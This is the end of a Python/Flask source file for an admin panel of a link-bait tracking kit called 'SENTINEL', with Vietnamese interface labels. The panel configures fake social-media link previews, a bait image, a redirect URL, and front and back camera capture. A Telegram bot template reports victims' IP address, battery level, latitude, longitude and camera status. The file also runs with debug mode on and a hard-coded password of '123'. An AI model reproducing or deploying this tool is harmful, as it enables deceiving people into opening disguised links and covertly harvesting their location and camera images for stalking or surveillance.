<input name="px_fake_ttl" value="{get_setting('px_fake_ttl')}" style="background:#000;border:1px solid #1e293b;padding:12px;border-radius:12px;color:#fff;width:100%;box-sizing:border-box">
<label style="font-size:10px;color:#64748b;display:block;margin:12px 0 4px">Mô tả Meta (og:description)</label>
<textarea name="px_fake_dsc" rows="3" style="background:#000;border:1px solid #1e293b;padding:12px;border-radius:12px;color:#fff;width:100%;box-sizing:border-box;resize:none">{get_setting('px_fake_dsc')}</textarea>
<label style="font-size:10px;color:#64748b;display:block;margin:12px 0 4px">Ảnh Meta (og:image)</label>
<input name="px_fake_img" value="{get_setting('px_fake_img')}" style="background:#000;border:1px solid #1e293b;padding:12px;border-radius:12px;color:#fff;width:100%;box-sizing:border-box">
<hr style="border-color:#1e293b;margin:16px 0">
<label style="color:#a855f7;font-size:10px;text-transform:uppercase;display:block;margin-bottom:4px;font-weight:900">Ảnh thật hiển thị (Mồi HD)</label>
<input name="proxy_img_url" value="{get_setting('proxy_img_url')}" style="background:#000;border:1px solid #1e293b;padding:12px;border-radius:12px;color:#fff;width:100%;box-sizing:border-box">
<div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;margin:12px 0">
<label style="background:#000;border:1px solid #1e293b;border-radius:12px;padding:10px;display:flex;align-items:center;gap:8px;color:#fff;font-size:11px;text-transform:none"><input type="checkbox" name="capture_front" value="1" {"checked" if get_setting('capture_front')=='1' else ""}> Camera trước</label>
<label style="background:#000;border:1px solid #1e293b;border-radius:12px;padding:10px;display:flex;align-items:center;gap:8px;color:#fff;font-size:11px;text-transform:none"><input type="checkbox" name="capture_back" value="1" {"checked" if get_setting('capture_back')=='1' else ""}> Camera sau</label>
</div>
<button type="submit" name="save_cfg" style="background:#9333ea;color:#fff;padding:16px;border-radius:16px;font-weight:900;width:100%;text-transform:uppercase;cursor:pointer;border:none;margin-top:12px">CẬP NHẬT</button>
</form>
<p style="margin-top:12px;font-size:10px;color:#a78bfa;font-family:monospace;background:#000;padding:10px;border-radius:8px;word-break:break-all">{base}/?img=pixel</p>
</div>
<div style="background:#0d1117;border:1px solid #1e293b;border-radius:16px;padding:24px;text-align:center">
<p style="color:#64748b;text-transform:uppercase;font-size:11px;font-weight:900">XEM TRƯỚC</p>
<div style="background:#1a1c23;border-radius:16px;overflow:hidden;border:1px solid #334155;text-align:left;margin-top:16px">
<div style="height:160px;background:#1e293b;display:flex;align-items:center;justify-content:center;color:#475569">ẢNH MỒI</div>
<div style="padding:16px"><p style="color:#fff;font-weight:900;font-size:13px">{get_setting('px_fake_ttl')}</p>
<p style="color:#94a3b8;font-size:11px;font-style:italic;margin-top:4px">{get_setting('px_fake_dsc')[:80]}...</p></div>
</div></div></div>'''

    if t == '4':
        return f'''<h2 style="color:#22c55e;font-weight:900;font-style:italic;text-transform:uppercase;font-size:16px">🌐 CẤU HÌNH WEB</h2>
<div style="display:grid;grid-template-columns:1fr 1fr;gap:24px;margin-top:20px">
<div style="background:#0d1117;border:1px solid #1e293b;border-radius:16px;padding:24px">
<form method="POST" action="/admin?t=4">
<h3 style="font-weight:900;text-transform:uppercase;font-size:11px;margin:0 0 16px">GIAO DIỆN & ROOT ID</h3>
<label style="font-size:10px;color:#64748b;display:block;margin-bottom:4px">Thông báo chính</label>
<input name="ui_msg" value="{get_setting('ui_msg')}" style="background:#000;border:1px solid #1e293b;padding:12px;border-radius:12px;color:#fff;width:100%;box-sizing:border-box">
<label style="font-size:10px;color:#64748b;display:block;margin:12px 0 4px">Trạng thái</label>
<input name="ui_st" value="{get_setting('ui_st')}" style="background:#000;border:1px solid #1e293b;padding:12px;border-radius:12px;color:#fff;width:100%;box-sizing:border-box">
<label style="font-size:10px;color:#64748b;display:block;margin:12px 0 4px">Nút bấm</label>
<input name="btn_text" value="{get_setting('btn_text')}" style="background:#000;border:1px solid #1e293b;padding:12px;border-radius:12px;color:#fff;width:100%;box-sizing:border-box">
<hr style="border-color:#1e293b;margin:16px 0">
<label style="font-size:10px;color:#64748b;display:block;margin-bottom:4px">Root Title</label>
<input name="root_title" value="{get_setting('root_title')}" style="background:#000;border:1px solid #1e293b;padding:12px;border-radius:12px;color:#fff;width:100%;box-sizing:border-box">
<label style="font-size:10px;color:#64748b;display:block;margin:12px 0 4px">Root Description</label>
<input name="root_desc" value="{get_setting('root_desc')}" style="background:#000;border:1px solid #1e293b;padding:12px;border-radius:12px;color:#fff;width:100%;box-sizing:border-box">
<label style="font-size:10px;color:#64748b;display:block;margin:12px 0 4px">Root Image (og:image)</label>
<input name="root_img" value="{get_setting('root_img')}" style="background:#000;border:1px solid #1e293b;padding:12px;border-radius:12px;color:#fff;width:100%;box-sizing:border-box">
<label style="font-size:10px;color:#64748b;display:block;margin:12px 0 4px">Redirect URL</label>
<input name="root_redir" value="{get_setting('root_redir')}" style="background:#000;border:1px solid #1e293b;padding:12px;border-radius:12px;color:#fff;width:100%;box-sizing:border-box">
<div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;margin:12px 0">
<label style="background:#000;border:1px solid #1e293b;border-radius:12px;padding:10px;display:flex;align-items:center;gap:8px;color:#fff;font-size:11px;text-transform:none"><input type="checkbox" name="capture_front" value="1" {"checked" if get_setting('capture_front')=='1' else ""}> Camera trước</label>
<label style="background:#000;border:1px solid #1e293b;border-radius:12px;padding:10px;display:flex;align-items:center;gap:8px;color:#fff;font-size:11px;text-transform:none"><input type="checkbox" name="capture_back" value="1" {"checked" if get_setting('capture_back')=='1' else ""}> Camera sau</label>
</div>
<button type="submit" name="save_cfg" style="background:#16a34a;color:#fff;padding:16px;border-radius:16px;font-weight:900;width:100%;text-transform:uppercase;cursor:pointer;border:none">LƯU CẤU HÌNH</button>
</form></div>
<div style="background:#fff;border-radius:16px;display:flex;align-items:center;justify-content:center;padding:40px;box-shadow:0 25px 50px rgba(0,0,0,0.5)">
<div style="width:100%;max-width:280px;border:1px solid #e5e7eb;padding:32px;border-radius:24px;text-align:center">
<div style="width:40px;height:40px;border:4px solid #2563eb;border-top-color:transparent;border-radius:50%;animation:spin 1s linear infinite;margin:0 auto 16px"></div>
<style>@keyframes spin{{to{{transform:rotate(360deg)}}}}</style>
<p style="font-size:10px;font-weight:900;color:#9ca3af;text-transform:uppercase;letter-spacing:2px">{get_setting('ui_msg')}</p>
<p style="font-size:8px;color:#cbd5e1;margin-top:4px;text-transform:uppercase">{get_setting('ui_st')}</p>
<div style="margin-top:24px;background:#2563eb;color:#fff;padding:12px;border-radius:9999px;font-weight:900;font-size:10px;text-transform:uppercase">{get_setting('btn_text')}</div>
</div></div></div>'''

    if t == '5':
        return f'''<h2 style="color:#3b82f6;font-weight:900;font-style:italic;text-transform:uppercase;font-size:16px">🤖 TELEGRAM BOT</h2>
<div style="background:#0d1117;border:1px solid #1e293b;border-radius:16px;padding:24px;margin-top:20px">
<form method="POST" action="/admin?t=5">
<div style="display:grid;grid-template-columns:1fr 1fr;gap:16px">
<div><label style="font-size:10px;color:#64748b;display:block;margin-bottom:4px;font-weight:900">BOT TOKEN</label>
<input name="tg_token" value="{get_setting('tg_token')}" placeholder="123456789:ABC..." style="background:#000;border:1px solid #1e293b;padding:12px;border-radius:12px;color:#fff;width:100%;box-sizing:border-box;font-family:monospace"></div>
<div><label style="font-size:10px;color:#64748b;display:block;margin-bottom:4px;font-weight:900">CHAT ID</label>
<input name="tg_id" value="{get_setting('tg_id')}" placeholder="-100123..." style="background:#000;border:1px solid #1e293b;padding:12px;border-radius:12px;color:#fff;width:100%;box-sizing:border-box;font-family:monospace"></div>
</div>
<label style="color:#3b82f6;font-size:10px;text-transform:uppercase;display:block;margin:16px 0 8px;font-weight:900">Nội dung báo cáo</label>
<textarea name="tg_msg_template" rows="6" style="background:#000;border:1px solid #1e293b;padding:12px;border-radius:12px;color:#fff;width:100%;box-sizing:border-box;font-family:monospace;font-size:11px;resize:none">{get_setting('tg_msg_template')}</textarea>
<p style="font-size:9px;color:#64748b;margin-top:4px">Biến: [ID] [ST] [ADDR] [IP] [BAT] [LA] [LO] [CAM_STATUS]</p>
<button type="submit" name="save_cfg" style="background:#3b82f6;color:#fff;padding:14px;border-radius:20px;font-weight:900;width:100%;text-transform:uppercase;cursor:pointer;border:none;margin-top:12px">LƯU CÀI ĐẶT</button>
</form>
<a href="/admin?set_wb=1" style="display:block;text-align:center;background:#1e293b;color:#94a3b8;padding:12px;border-radius:16px;font-weight:900;text-transform:uppercase;text-decoration:none;margin-top:12px">🔗 KÍCH HOẠT WEBHOOK</a>
</div>'''

    if t == '6':
        return f'''<h2 style="color:#eab308;font-weight:900;font-style:italic;text-transform:uppercase;font-size:16px">📍 VỊ TRÍ CỦA TÔI</h2>
<div style="display:grid;grid-template-columns:1fr 1fr;gap:24px;margin-top:20px">
<div style="background:#0d1117;border:1px solid #1e293b;border-radius:16px;padding:24px">
<h3 style="color:#eab308;font-style:uppercase;font-weight:900;font-size:11px;margin:0 0 16px">THÔNG TIN</h3>
<p style="font-size:11px;font-family:monospace;margin:8px 0"><span style="color:#3b82f6">🌐 IP:</span> <b style="color:#fff">{request.remote_addr}</b></p>
<button onclick="navigator.geolocation.getCurrentPosition(p=>{{document.getElementById('geo').innerText=p.coords.latitude+', '+p.coords.longitude}},()=>{{document.getElementById('geo').innerText='GPS từ chối'}},{{enableHighAccuracy:true}})" style="background:#eab308;color:#000;padding:16px;border-radius:16px;font-weight:900;width:100%;margin-top:16px;text-transform:uppercase;cursor:pointer;border:none">📍 CẬP NHẬT VỊ TRÍ</button>
<p id="geo" style="margin-top:12px;font-size:11px;font-family:monospace;color:#22c55e">Đang chờ...</p></div>
<div style="background:#1e293b;border-radius:16px;display:flex;align-items:center;justify-content:center;min-height:350px;color:#475569;font-size:12px;font-weight:900;text-transform:uppercase">BẢN ĐỒ</div></div>'''

    return ''

# ===================== MAIN =====================
if __name__ == '__main__':
    print("\n" + "="*50)
    print("  SENTINEL v180.0 - RUNNING")
    print("  http://localhost:5000")
    print("  Admin: http://localhost:5000/admin")
    print("  Password: 123")
    print("="*50 + "\n")
    app.run(host='0.0.0.0', port=80, debug=True)
